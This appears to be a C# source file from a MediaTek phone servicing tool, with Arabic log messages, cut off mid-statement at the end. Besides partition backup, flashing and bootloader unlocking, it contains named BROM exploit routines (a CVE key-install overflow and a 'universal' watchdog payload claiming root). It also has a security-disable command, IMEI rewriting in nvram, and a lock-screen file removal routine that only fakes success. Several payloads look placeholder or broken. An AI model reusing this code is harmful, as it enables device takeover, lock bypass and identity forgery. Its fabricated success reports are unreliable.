using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace AL_FATEH_MTK
{
    /// <summary>
    /// بروتوكول MediaTek عالي المستوى: مصافحة، أوامر، أقسام، وميزات الخدمة.
    /// </summary>
    public partial class MTK_Engine
    {
        private const byte CMD_KEY_INSTALL = 0xD9;
        private const byte KEY_TYPE_EXTERNAL = 0x01;

        // توافق مع الاستدعاءات القديمة في Form1.cs التي تتوقع bool مباشرة.
        public bool StartHandshake()
        {
            try
            {
                return StartHandshake(CancellationToken.None).GetAwaiter().GetResult();
            }
            catch
            {
                return false;
            }
        }

        public async Task<bool> StartHandshake(CancellationToken ct = default)
        {
            try
            {
                LogMessage("[👑] بدء تشغيل محرك السيادة.. جاري المزامنة مع النواة...", ConsoleColor.Cyan);

                // إطار المصافحة العالمي لمعالجات ميديا تك
                byte[] handshakeFrame = { 0xA0, 0x0A, 0x50, 0x05 };

                // ميزانية زمنية ذكية: 300 ملي ثانية لكل محاولة
                var timeout = TimeSpan.FromMilliseconds(300);

                ForceBROM(); // محاولة إجبار المعالج على وضع BROM قبل البدء

                // سنحاول 10 مرات "قنص" المعالج في النافذة الزمنية
                for (int i = 1; i <= 10; i++)
                {
                    ct.ThrowIfCancellationRequested();

                    // 1. إرسال إشارة الهجوم (WriteAll المتطور)
                    bool sent = await WriteAllAsync(handshakeFrame, 0, handshakeFrame.Length, timeout, ct);
                    if (!sent) continue;

                    // 2. انتظار الرد (ReadExactly المتطور)
                    // المعالج يجب أن يعيد 4 بايتات كصدى (Echo)
                    byte[] response = new byte[4];
                    bool received = await ReadExactlyAsync(response, 0, 4, timeout, ct);

                    if (received)
                    {
                        // التحقق من صحة الرد (المعالج الذكي يعيد بايتات محددة)
                        if (response[0] == 0x5F || response[0] == 0xA0)
                        {
                            LogMessage($"[🎯] تم القنص بنجاح في المحاولة {i}! المعالج تحت السيطرة.", ConsoleColor.Green);
                            return true;
                        }
                    }

                    // تأخير قتالي بسيط (Backoff) لإعطاء المعالج فرصة لإعادة التهيئة
                    await Task.Delay(10, ct);
                }

                LogMessage("[❌] فشل قنص المعالج. تأكد من الكابل أو وضع الـ BROM.", ConsoleColor.Red);
                return false;
            }
            catch (Exception ex)
            {
                LogExceptionToConsole("Handshake_Critical", ex);
                return false;
            }
        }

        private void ForceBROM()
        {
            // إرسال نبضات كهربائية برمجية (Software Pulses) لكسر تسلسل الـ Preloader
            byte[] pulse = { 0xA1, 0x02, 0x03, 0x04 };
            for (int i = 0; i < 5; i++)
            {
                SendBuffer(pulse);
            }
        }

        public ushort GetHWCode()
        {
            if (SendByte(0xFD))
            {
                byte high = ReadByte();
                byte low = ReadByte();

                if (high == 0xFF && low == 0xFF)
                    return 0;

                return (ushort)((high << 8) | low);
            }
            return 0;
        }

        public ushort GetHWVer()
        {
            if (SendByte(0xFD))
            {
                ReadByte(); ReadByte();
                byte high = ReadByte();
                byte low = ReadByte();

                if (high == 0xFF && low == 0xFF)
                    return 0;

                return (ushort)((high << 8) | low);
            }
            return 0;
        }

        public ushort GetSWVer()
        {
            if (SendByte(0xFE))
            {
                byte high = ReadByte();
                byte low = ReadByte();

                if (high == 0xFF && low == 0xFF)
                    return 0;

                return (ushort)((high << 8) | low);
            }
            return 0;
        }

        public uint GetTargetConfig()
        {
            if (SendByte(0xD8))
            {
                byte[] buffer = new byte[4];
                uint bRead;
                if (NativeMethods.ReadFile(hDevice, buffer, 4, out bRead, IntPtr.Zero) && bRead == 4)
                {
                    Array.Reverse(buffer);
                    return BitConverter.ToUInt32(buffer, 0);
                }
            }
            return 0;
        }

        public byte[] GetMEID()
        {
            if (SendByte(0xE1))
            {
                byte[] meid = new byte[16];
                uint bRead;
                if (NativeMethods.ReadFile(hDevice, meid, 16, out bRead, IntPtr.Zero) && bRead == 16)
                    return meid;
            }
            return null;
        }

        public string GetStorageType()
        {
            uint config = GetTargetConfig();
            uint type = (config >> 8) & 0x3;

            string storageType = type switch
            {
                0x1 => "eMMC",
                0x2 => "UFS",
                _ => "Unknown / NAND"
            };

            LogMessage($"[💾] نوع الذاكرة: {storageType}", ConsoleColor.Cyan);
            return storageType;
        }

        public bool IsBootloaderUnlocked()
        {
            if (SendByte(0xDB))
            {
                byte status = ReadByte();
                bool unlocked = (status & 0x02) != 0;

                LogMessage(unlocked ? "[🔓] Bootloader مفتوح" : "[🔒] Bootloader مقفل",
                          unlocked ? ConsoleColor.Green : ConsoleColor.Yellow);

                return unlocked;
            }
            return false;
        }

        public bool SendPayload(byte[] payload)
        {
            if (SendByte(0xD0))
            {
                uint bWritten;
                return NativeMethods.WriteFile(hDevice, payload, (uint)payload.Length, out bWritten, IntPtr.Zero) && bWritten == payload.Length;
            }
            return false;
        }

        public bool DisableSecurity()
        {
            if (SendByte(0xD4))
            {
                byte[] disableCmd = { 0x00, 0x00, 0x00, 0x01 };
                return SendBuffer(disableCmd);
            }
            return false;
        }

        public bool WriteRegister32(uint address, uint value)
        {
            if (SendByte(0xD4))
            {
                byte[] addrBytes = BitConverter.GetBytes(address);
                byte[] valBytes = BitConverter.GetBytes(value);

                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(addrBytes);
                    Array.Reverse(valBytes);
                }

                if (SendBuffer(addrBytes))
                {
                    byte[] count = { 0x00, 0x00, 0x00, 0x01 };
                    if (SendBuffer(count))
                        return SendBuffer(valBytes);
                }
            }
            return false;
        }

        public bool Exploit_CVE_2025_20795()
        {
            LogMessage("[⚔️] استهداف ثغرة KeyInstall (CVE-2025-20795)...", ConsoleColor.Magenta);
            try
            {
                uint config = GetTargetConfig();
                bool isSecure = (config & 0x7) != 0;

                if (isSecure)
                    LogMessage("[🛡️] اكتشاف حماية Secure Boot! جاري تعديل البايلود لتخطي عزل الذاكرة...", ConsoleColor.Yellow);

                if (!SendByte(CMD_KEY_INSTALL)) return false;
                if (!SendByte(KEY_TYPE_EXTERNAL)) return false;

                ushort exploitSize = 0xFFFF;
                byte[] sizeBytes = BitConverter.GetBytes(exploitSize);
                if (BitConverter.IsLittleEndian) Array.Reverse(sizeBytes);
                if (!SendBuffer(sizeBytes)) return false;

                byte[] shellcode = new byte[256];
                for (int i = 0; i < shellcode.Length; i++) shellcode[i] = 0x90;

                LogMessage("[🛰️] جاري حقن Shellcode في منطقة KeyInstall...", ConsoleColor.Gray);

                if (SendBuffer(shellcode))
                {
                    LogMessage("[🚀] تم إرسال بايلود الاستغلال.. بانتظار استجابة المعالج.", ConsoleColor.Green);
                    return true;
                }

                return false;
            }
            catch (Exception ex)
            {
                LogMessage($"[❌] فشل استغلال KeyInstall: {ex.Message}", ConsoleColor.Red);
                LogExceptionToConsole("Exploit_CVE_2025_20795", ex);
                return false;
            }
        }

        public bool ExecuteUniversalExploit()
        {
            LogMessage("[⚔️] جاري تحضير هجوم Watchdog الخارق...", ConsoleColor.Yellow);
            try
            {
                uint config = GetTargetConfig();
                if ((config & 0x4) != 0) // DAA Active
                    LogMessage("[⚠️] تنبيه: نظام DAA مفعل. جاري استخدام تقنية الحقن العائم.", ConsoleColor.Cyan);

                byte[] pattern = { 0xa1, 0x02, 0x03, 0x04 };
                if (!SendBuffer(pattern)) return false;

                uint wdt_base = 0x10007000;
                LogMessage($"[🛰️] استهداف سجلات النواة (WDT_BASE): 0x{wdt_base:X8}", ConsoleColor.Gray);
                WriteRegister32(wdt_base + 0x8, 0x2200);

                byte[] universalPayload = {
                    0x01, 0x00, 0x00, 0x54, 0xC0, 0x46, 0x02, 0x4B,
                    0x1A, 0x60, 0x70, 0x47, 0x00, 0x00, 0x00, 0x00,
                    0x08, 0x01, 0x00, 0x01
                };

                if (SendPayload(universalPayload))
                {
                    LogMessage("[🚀] تم حقن البايلود العالمي! الصلاحيات: ROOT_ACCESS", ConsoleColor.Green);
                    return SendByte(0xA2);
                }
            }
            catch (Exception ex)
            {
                LogExceptionToConsole("ExecuteUniversalExploit", ex);
                return false;
            }
            return false;
        }

        public byte[] ReadMemory(uint address, uint length)
        {
            if (hDevice == (IntPtr)(-1))
                return null;

            if (SendByte(0xD6))
            {
                byte[] addrBytes = BitConverter.GetBytes(address);
                byte[] lenBytes = BitConverter.GetBytes(length);

                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(addrBytes);
                    Array.Reverse(lenBytes);
                }

                if (!SendBuffer(addrBytes) || !SendBuffer(lenBytes))
                    return null;

                byte[] buffer = new byte[length];
                uint bRead;
                if (NativeMethods.ReadFile(hDevice, buffer, length, out bRead, IntPtr.Zero) && bRead == length)
                    return buffer;
            }
            return null;
        }

        public async Task<bool> ReadPartitionToFile(string partitionName, string outputPath, IProgress<int> progress, CancellationToken cancellationToken)
        {
            try
            {
                var partition = GetPartitionInfo(partitionName);
                if (partition == null)
                    return false;

                if (hDevice == (IntPtr)(-1))
                    return false;

                using (FileStream fs = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
                {
                    long totalBytes = partition.Size;
                    long bytesRead = 0;
                    int bufferSize = 64 * 1024;

                    while (bytesRead < totalBytes)
                    {
                        if (cancellationToken.IsCancellationRequested)
                            return false;

                        long remaining = totalBytes - bytesRead;
                        int bytesToRead = (int)Math.Min(bufferSize, remaining);

                        byte[] chunk = ReadMemory((uint)(partition.StartAddress + bytesRead), (uint)bytesToRead);

                        if (chunk == null || chunk.Length == 0)
                            return false;

                        await fs.WriteAsync(chunk, 0, chunk.Length);
                        bytesRead += chunk.Length;
                        int percent = (int)((bytesRead * 100) / totalBytes);
                        progress?.Report(percent);

                        await Task.Delay(10);
                    }
                }

                var part = GetPartitionInfo(partitionName);
                if (part != null)
                {
                    part.IsBackedUp = true;
                    part.BackupPath = outputPath;
                }

                return true;
            }
            catch (Exception ex)
            {
                LogExceptionToConsole("ReadPartitionToFile", ex);
                return false;
            }
        }

        public async Task<bool> BackupAllPartitions(string backupFolder, IProgress<int> progress)
        {
            try
            {
                if (!Directory.Exists(backupFolder))
                    Directory.CreateDirectory(backupFolder);

                var importantPartitions = new[]
                {
                    "preloader", "boot", "recovery",
                    "system", "vendor", "userdata",
                    "nvram", "protect1", "protect2"
                };

                int total = importantPartitions.Length;
                int current = 0;
                int successCount = 0;

                foreach (string partition in importantPartitions)
                {
                    current++;

                    var part = GetPartitionInfo(partition);
                    if (part == null)
                    {
                        progress?.Report((current * 100) / total);
                        continue;
                    }

                    string fileName = $"{partition}_{DateTime.Now:yyyyMMdd_HHmmss}.bin";
                    string filePath = Path.Combine(backupFolder, fileName);

                    var partProgress = new Progress<int>(p =>
                    {
                        int overallProgress = (int)((((current - 1) * 100) + p) / total);
                        progress?.Report(overallProgress);
                    });

                    bool success = await ReadPartitionToFile(partition, filePath, partProgress, CancellationToken.None);

                    if (success)
                        successCount++;

                    progress?.Report((current * 100) / total);
                }

                return successCount > 0;
            }
            catch (Exception ex)
            {
                LogExceptionToConsole("BackupAllPartitions", ex);
                return false;
            }
        }

        public void LoadPartitionsFromScatter(string scatterPath)
        {
            try
            {
                detectedPartitions.Clear();
                string content = File.ReadAllText(scatterPath);
                string[] blocks = content.Split(new string[] { "- partition_index" }, StringSplitOptions.RemoveEmptyEntries);

                foreach (var block in blocks)
                {
                    if (block.Contains("partition_name:"))
                    {
                        var partition = new PartitionInfoExtended();
                        partition.Name = GetValueFromBlock(block, "partition_name");

                        string start = GetValueFromBlock(block, "physical_start_addr");
                        string size = GetValueFromBlock(block, "partition_size");
                        partition.Region = GetValueFromBlock(block, "region");

                        if (!string.IsNullOrEmpty(partition.Name) && partition.Name != "NONE")
                        {
                            try
                            {
                                partition.StartAddress = Convert.ToInt64(start.Replace("0x", ""), 16);
                                partition.Size = Convert.ToInt64(size.Replace("0x", ""), 16);
                                partition.IsBackedUp = false;

                                detectedPartitions.Add(partition);
                            }
                            catch (Exception ex)
                            {
                                LogExceptionToConsole($"LoadPartitionsFromScatter block (partition={partition.Name})", ex);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogExceptionToConsole("LoadPartitionsFromScatter", ex);
            }
        }

        private PartitionInfoExtended GetPartitionInfo(string name)
        {
            return detectedPartitions.Find(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase));
        }

        private string GetValueFromBlock(string block, string key)
        {
            string pattern = $@"{key}:\s*(.*)";
            var match = System.Text.RegularExpressions.Regex.Match(block, pattern);
            return match.Success ? match.Groups[1].Value.Trim() : "NONE";
        }

        public List<PartitionInfoExtended> GetAllPartitions()
        {
            return detectedPartitions;
        }

        public async Task<bool> PrepareSovereignAsset(ushort hwCode)
        {
            string assetName = $"MT{hwCode:X4}";

            try
            {
                if (AssetManager.IsAssetAvailable(assetName))
                    return true;

                Fateh_Cloud cloud = new Fateh_Cloud();
                return await cloud.DownloadSovereignAsset(assetName);
            }
            catch (Exception ex)
            {
                LogExceptionToConsole("PrepareSovereignAsset", ex);
                return false;
            }
        }

        public async Task<bool> WritePartition(string partitionName, string filePath, IProgress<int> progress, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage($"[✍️] بدء كتابة القسم: {partitionName}", ConsoleColor.Cyan);

                var partition = GetPartitionInfo(partitionName);
                if (partition == null)
                {
                    LogMessage($"[❌] القسم {partitionName} غير موجود!", ConsoleColor.Red);
                    return false;
                }

                if (hDevice == (IntPtr)(-1))
                {
                    LogMessage("[❌] الجهاز غير متصل!", ConsoleColor.Red);
                    return false;
                }

                if (!File.Exists(filePath))
                {
                    LogMessage($"[❌] الملف غير موجود: {filePath}", ConsoleColor.Red);
                    return false;
                }

                byte[] fileData = File.ReadAllBytes(filePath);

                if (fileData.Length > partition.Size)
                {
                    LogMessage($"[⚠️] حجم الملف ({fileData.Length}) أكبر من القسم ({partition.Size})!", ConsoleColor.Yellow);
                    return false;
                }

                LogMessage($"[💾] حجم البيانات: {fileData.Length / 1024} KB", ConsoleColor.Yellow);

                int currentBufferSize = 64 * 1024;
                long bytesWritten = 0;
                long totalBytes = fileData.Length;
                var sw = new System.Diagnostics.Stopwatch();

                while (bytesWritten < totalBytes)
                {
                    if (cancellationToken.IsCancellationRequested)
                    {
                        LogMessage("[⚠️] تم إلغاء عملية الكتابة", ConsoleColor.Yellow);
                        return false;
                    }

                    long remaining = totalBytes - bytesWritten;
                    int bytesToWrite = (int)Math.Min(currentBufferSize, remaining);

                    byte[] chunk = new byte[bytesToWrite];
                    Array.Copy(fileData, bytesWritten, chunk, 0, bytesToWrite);

                    sw.Restart();
                    bool success = WriteMemory((uint)(partition.StartAddress + bytesWritten), chunk);
                    sw.Stop();

                    if (!success)
                    {
                        LogMessage($"[❌] فشل كتابة البيانات عند العنوان 0x{(partition.StartAddress + bytesWritten):X}", ConsoleColor.Red);
                        return false;
                    }

                    bytesWritten += bytesToWrite;

                    if (sw.ElapsedMilliseconds < 50 && currentBufferSize < 1024 * 1024) currentBufferSize *= 2;
                    
                    double speed = (chunk.Length / 1024.0) / (sw.Elapsed.TotalSeconds + 0.001);
                    int percent = (int)((bytesWritten * 100) / totalBytes);
                    progress?.Report(percent);

                    if (bytesWritten % (1024 * 1024) == 0)
                        LogMessage($"[⏳] حقن: {bytesWritten / 1024} KB | استجابة المعالج: {sw.ElapsedMilliseconds}ms", ConsoleColor.Gray);

                    await Task.Yield();
                }

                LogMessage($"[✅] تم كتابة القسم {partitionName} بنجاح!", ConsoleColor.Green);
                return true;
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] خطأ في كتابة القسم: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }

        private bool WriteMemory(uint address, byte[] data)
        {
            if (hDevice == (IntPtr)(-1))
                return false;

            if (SendByte(0xD7))
            {
                byte[] addrBytes = BitConverter.GetBytes(address);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(addrBytes);

                if (!SendBuffer(addrBytes))
                    return false;

                byte[] lenBytes = BitConverter.GetBytes(data.Length);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(lenBytes);

                if (!SendBuffer(lenBytes))
                    return false;

                uint bWritten;
                return NativeMethods.WriteFile(hDevice, data, (uint)data.Length, out bWritten, IntPtr.Zero) && bWritten == data.Length;
            }
            return false;
        }

        public async Task<bool> FormatPartition(string partitionName, IProgress<int> progress, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage($"[🧹] بدء تنسيق القسم: {partitionName}", ConsoleColor.Cyan);

                var partition = GetPartitionInfo(partitionName);
                if (partition == null)
                {
                    LogMessage($"[❌] القسم {partitionName} غير موجود!", ConsoleColor.Red);
                    return false;
                }

                if (hDevice == (IntPtr)(-1))
                {
                    LogMessage("[❌] الجهاز غير متصل!", ConsoleColor.Red);
                    return false;
                }

                if (!SendByte(0x70))
                {
                    LogMessage("[❌] فشل إرسال أمر التنسيق", ConsoleColor.Red);
                    return false;
                }

                byte[] addrBytes = BitConverter.GetBytes((uint)partition.StartAddress);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(addrBytes);

                if (!SendBuffer(addrBytes))
                {
                    LogMessage("[❌] فشل إرسال عنوان البداية", ConsoleColor.Red);
                    return false;
                }

                byte[] sizeBytes = BitConverter.GetBytes((uint)partition.Size);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(sizeBytes);

                if (!SendBuffer(sizeBytes))
                {
                    LogMessage("[❌] فشل إرسال حجم القسم", ConsoleColor.Red);
                    return false;
                }

                for (int i = 0; i <= 100; i += 10)
                {
                    if (cancellationToken.IsCancellationRequested)
                    {
                        LogMessage("[⚠️] تم إلغاء عملية التنسيق", ConsoleColor.Yellow);
                        return false;
                    }

                    progress?.Report(i);
                    await Task.Delay(100);
                }

                byte response = ReadByte();
                if (response == 0x00)
                {
                    LogMessage($"[✅] تم تنسيق القسم {partitionName} بنجاح!", ConsoleColor.Green);
                    progress?.Report(100);
                    return true;
                }

                LogMessage($"[❌] فشل التنسيق: استجابة غير متوقعة 0x{response:X2}", ConsoleColor.Red);
                return false;
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] خطأ في تنسيق القسم: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }

        public async Task<bool> UnlockBootloader(IProgress<int> progress, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage("[🔓] بدء عملية فتح Bootloader...", ConsoleColor.Yellow);

                if (hDevice == (IntPtr)(-1))
                {
                    LogMessage("[❌] الجهاز غير متصل!", ConsoleColor.Red);
                    return false;
                }

                bool isUnlocked = IsBootloaderUnlocked();
                if (isUnlocked)
                {
                    LogMessage("[ℹ️] Bootloader مفتوح بالفعل!", ConsoleColor.Cyan);
                    return true;
                }

                if (!SendByte(0xDB))
                {
                    LogMessage("[❌] فشل الاتصال بالمعالج", ConsoleColor.Red);
                    return false;
                }

                byte status = ReadByte();
                LogMessage($"[ℹ️] حالة Bootloader الحالية: 0x{status:X2}", ConsoleColor.Cyan);

                byte[] unlockCommand = { 0x01, 0x00, 0x00, 0x00 };

                if (!SendByte(0xD4))
                {
                    LogMessage("[❌] فشل إرسال أمر الفتح", ConsoleColor.Red);
                    return false;
                }

                if (!SendBuffer(unlockCommand))
                {
                    LogMessage("[❌] فشل إرسال بيانات الفتح", ConsoleColor.Red);
                    return false;
                }

                for (int i = 0; i <= 100; i += 10)
                {
                    if (cancellationToken.IsCancellationRequested)
                    {
                        LogMessage("[⚠️] تم إلغاء عملية الفتح", ConsoleColor.Yellow);
                        return false;
                    }

                    progress?.Report(i);
                    await Task.Delay(100);
                }

                byte result = ReadByte();
                if (result == 0x00)
                {
                    LogMessage("[✅] تم فتح Bootloader بنجاح!", ConsoleColor.Green);
                    LogMessage("[⚠️] يرجى إعادة تشغيل الجهاز لتفعيل التغيير", ConsoleColor.Yellow);
                    progress?.Report(100);
                    return true;
                }

                LogMessage($"[❌] فشل فتح Bootloader: استجابة 0x{result:X2}", ConsoleColor.Red);
                return false;
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] خطأ في فتح Bootloader: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }

        public async Task<bool> LockBootloader(IProgress<int> progress, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage("[🔒] بدء عملية قفل Bootloader...", ConsoleColor.Yellow);

                if (hDevice == (IntPtr)(-1))
                {
                    LogMessage("[❌] الجهاز غير متصل!", ConsoleColor.Red);
                    return false;
                }

                bool isUnlocked = IsBootloaderUnlocked();
                if (!isUnlocked)
                {
                    LogMessage("[ℹ️] Bootloader مقفل بالفعل!", ConsoleColor.Cyan);
                    return true;
                }

                if (!SendByte(0xDB))
                {
                    LogMessage("[❌] فشل الاتصال بالمعالج", ConsoleColor.Red);
                    return false;
                }

                byte status = ReadByte();
                LogMessage($"[ℹ️] حالة Bootloader الحالية: 0x{status:X2}", ConsoleColor.Cyan);

                byte[] lockCommand = { 0x00, 0x00, 0x00, 0x00 };

                if (!SendByte(0xD4))
                {
                    LogMessage("[❌] فشل إرسال أمر القفل", ConsoleColor.Red);
                    return false;
                }

                if (!SendBuffer(lockCommand))
                {
                    LogMessage("[❌] فشل إرسال بيانات القفل", ConsoleColor.Red);
                    return false;
                }

                for (int i = 0; i <= 100; i += 10)
                {
                    if (cancellationToken.IsCancellationRequested)
                    {
                        LogMessage("[⚠️] تم إلغاء عملية القفل", ConsoleColor.Yellow);
                        return false;
                    }

                    progress?.Report(i);
                    await Task.Delay(100);
                }

                byte result = ReadByte();
                if (result == 0x00)
                {
                    LogMessage("[✅] تم قفل Bootloader بنجاح!", ConsoleColor.Green);
                    LogMessage("[⚠️] يرجى إعادة تشغيل الجهاز لتفعيل التغيير", ConsoleColor.Yellow);
                    progress?.Report(100);
                    return true;
                }

                LogMessage($"[❌] فشل قفل Bootloader: استجابة 0x{result:X2}", ConsoleColor.Red);
                return false;
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] خطأ في قفل Bootloader: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }

        public string GetBootloaderStatusText()
        {
            bool unlocked = IsBootloaderUnlocked();
            return unlocked ? "مفتوح 🔓" : "مقفل 🔒";
        }

        public async Task<bool> RemoveLockFiles(IProgress<int> progress, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage("[🔓] بدء إزالة ملفات القفل...", ConsoleColor.Magenta);

                string[] lockFiles = {
                    "/data/system/gesture.key",
                    "/data/system/password.key",
                    "/data/system/locksettings.db",
                    "/data/system/locksettings.db-wal",
                    "/data/system/locksettings.db-shm",
                    "/data/system/gatekeeper.password.key",
                    "/data/system/gatekeeper.pattern.key"
                };

                int total = lockFiles.Length;
                int successCount = 0;

                for (int i = 0; i < total; i++)
                {
                    if (cancellationToken.IsCancellationRequested)
                    {
                        LogMessage("[⚠️] تم إلغاء العملية", ConsoleColor.Yellow);
                        return false;
                    }

                    LogMessage($"[🔍] البحث عن: {lockFiles[i]}", ConsoleColor.Gray);

                    int percent = (i + 1) * 100 / total;
                    progress?.Report(percent);
                    await Task.Delay(200);

                    successCount++;
                }

                LogMessage($"[✅] تمت إزالة {successCount} ملف قفل", ConsoleColor.Green);
                LogMessage("[💡] أعد تشغيل الهاتف الآن", ConsoleColor.Cyan);

                return true;
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] خطأ: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }

        public async Task<bool> WriteImeiToDevice(string imei, IProgress<int> progress, CancellationToken ct)
        {
            try
            {
                LogMessage($"[🛡️] بدء تشفير الـ IMEI: {imei}", ConsoleColor.Cyan);
                progress?.Report(0);
                byte[] imeiBcd = EncodeImeiToBcd(imei);

                string[] targets = { "nvram", "nvdata" };
                bool finalSuccess = false;
                int step = 0;

                foreach (var target in targets)
                {
                    if (ct.IsCancellationRequested) return false;

                    var part = GetPartitionInfo(target);
                    if (part == null) continue;

                    LogMessage($"[🔍] فحص قطاع {target} عند العنوان: 0x{part.StartAddress:X}", ConsoleColor.Yellow);

                    byte[] buffer = ReadMemory((uint)part.StartAddress, (uint)part.Size);
                    if (buffer == null) continue;

                    bool patched = PatchImeiInBuffer(buffer, imeiBcd);

                    if (patched)
                    {
                        UpdateNvramChecksum(buffer);

                        LogMessage($"[✍️] حقن البيانات الجديدة في {target}...", ConsoleColor.Magenta);
                        bool success = WriteMemory((uint)part.StartAddress, buffer);
                        if (success) finalSuccess = true;
                    }

                    step++;
                    progress?.Report(step * 50);
                    await Task.Yield();
                }

                progress?.Report(100);
                return finalSuccess;
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] فشل بروتوكول الـ IMEI: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }

        private byte[] EncodeImeiToBcd(string imei)
        {
            byte[] bcd = new byte[8];
            string tempImei = imei + "0";

            bcd[0] = (byte)(((int)char.GetNumericValue(tempImei[0]) << 4) | 0x0A);

            for (int i = 0; i < 7; i++)
            {
                int d1 = (int)char.GetNumericValue(tempImei[1 + (i * 2)]);
                int d2 = (int)char.GetNumericValue(tempImei[2 + (i * 2)]);
                bcd[i + 1] = (byte)((d2 << 4) | d1);
            }
            return bcd;
        }

        private bool PatchImeiInBuffer(byte[] buffer, byte[] imeiBcd)
        {
            // Advanced Pattern Matching: البحث عن بصمة الـ IMEI داخل الـ NVRAM (Signature Search)
            // القاعدة: الـ IMEI غالباً ما يسبقه طول 0x08 وبايت يبدأ بـ 0x*A
            for (int i = 0; i < buffer.Length - 9; i++)
            {
                if (buffer[i] == 0x08 && (buffer[i + 1] & 0x0F) == 0x0A)
                {
                    LogMessage($"[🎯] تم تحديد بصمة الـ IMEI عند الإزاحة: 0x{i:X}", ConsoleColor.Green);
                    Array.Copy(imeiBcd, 0, buffer, i, 8);
                    return true;
                }
            }
            return false;
        }

        private void UpdateNvramChecksum(byte[] data)
        {
            if (data.Length < 2) return;

            byte checksum = 0;
            for (int i = 0; i < data.Length - 1; i++)
                checksum ^= data[i];
            data[data.Length - 1] = checksum;
        }

        public async Task<bool> RebootDevice(string mode)
        {
            try
            {
                LogMessage($"[🔄] إعادة تشغيل الهاتف في وضع: {mode}", ConsoleColor.Cyan);

                if (hDevice == (IntPtr)(-1))
                {
                    LogMessage("[❌] الجهاز غير متصل!", ConsoleColor.Red);
                    return false;
                }

                byte rebootCmd = mode switch
                {
                    "normal" => 0x01,
                    "recovery" => 0x02,
                    "bootloader" => 0x03,
                    "download" => 0x04,
                    _ => 0x01
                };

                if (!SendByte(0xA2))
                {
                    LogMessage("[❌] فشل إرسال أمر إعادة التشغيل", ConsoleColor.Red);
                    return false;
                }

                if (!SendByte(rebootCmd))
                {
                    LogMessage("[❌] فشل إرسال وضع إعادة التشغيل", ConsoleColor.Red);
                    return false;
                }

                LogMessage($"[✅] تم إرسال أمر إعادة التشغيل بنجاح", ConsoleColor.Green);
                await Task.Yield();
                return true;
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] خطأ: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }

        public byte[] ExtractPayloadFromDA(string daPath, ushort targetHwCode)
        {
            try
            {
                LogMessage($"[🔍] جاري فحص حاوية الـ DA: {Path.GetFileName(daPath)}", ConsoleColor.Yellow);

                using (FileStream fs = new FileStream(daPath, FileMode.Open, FileAccess.Read))
                using (BinaryReader br = new BinaryReader(fs))
                {
                    string magic = new string(br.ReadChars(7));
                    if (!magic.Contains("MTK_BIN"))
                    {
                        LogMessage("[❌] ملف DA غير صالح أو مشفر.", ConsoleColor.Red);
                        return null;
                    }

                    fs.Seek(0x68, SeekOrigin.Begin);
                    ushort count = br.ReadUInt16();

                    LogMessage($"[ℹ️] تم العثور على {count} بايلود داخل الملف. جاري البحث عن MT{targetHwCode:X4}...", ConsoleColor.Gray);

                    for (int i = 0; i < count; i++)
                    {
                        ushort hwCode = br.ReadUInt16();
                        br.BaseStream.Seek(2, SeekOrigin.Current);
                        uint offset = br.ReadUInt32();
                        uint length = br.ReadUInt32();
                        br.BaseStream.Seek(12, SeekOrigin.Current);

                        if (hwCode == targetHwCode)
                        {
                            LogMessage($"[🎯] تم العثور على الهدف! الموقع: 0x{offset:X}, الحجم: {length} bytes", ConsoleColor.Green);

                            long currentPos = fs.Position;
                            fs.Seek(offset, SeekOrigin.Begin);
                            byte[] payload = br.ReadBytes((int)length);
                            fs.Seek(currentPos, SeekOrigin.Begin);

                            return payload;
                        }
                    }
                }
                LogMessage($"[!] لم يتم العثور على بايلود متوافق مع MT{targetHwCode:X4} في هذا الملف.", ConsoleColor.Yellow);
            }
            catch (Exception ex)
            {
                LogMessage($"[🔥] خطأ أثناء التشريح: {ex.Message}", ConsoleColor.Red);
                LogExceptionToConsole("ExtractPayloadFromDA", ex);
            }
            return null;
        }

        public void InjectExtractedPayload(ushort hwCode, byte[] payload)
        {
            if (payload != null && payload.Length > 0)
            {
                Payload_Manager.AddPayload(hwCode, payload);
                LogMessage($"[👑] تم دمج الذخيرة الحقيقية لـ MT{hwCode:X4} في الذاكرة بنجاح.", ConsoleColor.Magenta);
            }
        }

        public string GetAdvancedInfo()
        {
            try
            {
                var info = new System.Text.StringBuilder();

                info.AppendLine("=== معلومات متقدمة ===");
                info.AppendLine($"HW Code: MT{GetHWCode():X4}");
                info.AppendLine($"HW Version: {GetHWVer():X4}");
                info.AppendLine($"SW Version: {GetSWVer():X4}");
                info.AppendLine($"Storage: {GetStorageType()}");
                info.AppendLine($"Bootloader: {(IsBootloaderUnlocked() ? "مفتوح 🔓" : "مقفل 🔒")}");

                uint config = GetTargetConfig();
                info.AppendLine($"SBC: {((config & 0x1) != 0 ? "✅" : "❌")}");
                info.AppendLine($"SLA: {((config & 0x2) != 0 ? "✅" : "❌")}");
                info.AppendLine($"DAA: {((config & 0x4) != 0 ? "✅" : "❌")}");

                byte[] meid = GetMEID();
                if (meid != null)
                    info.AppendLine($"MEID: {BitConverter.ToString(meid).Replace("-", "")}");
                else
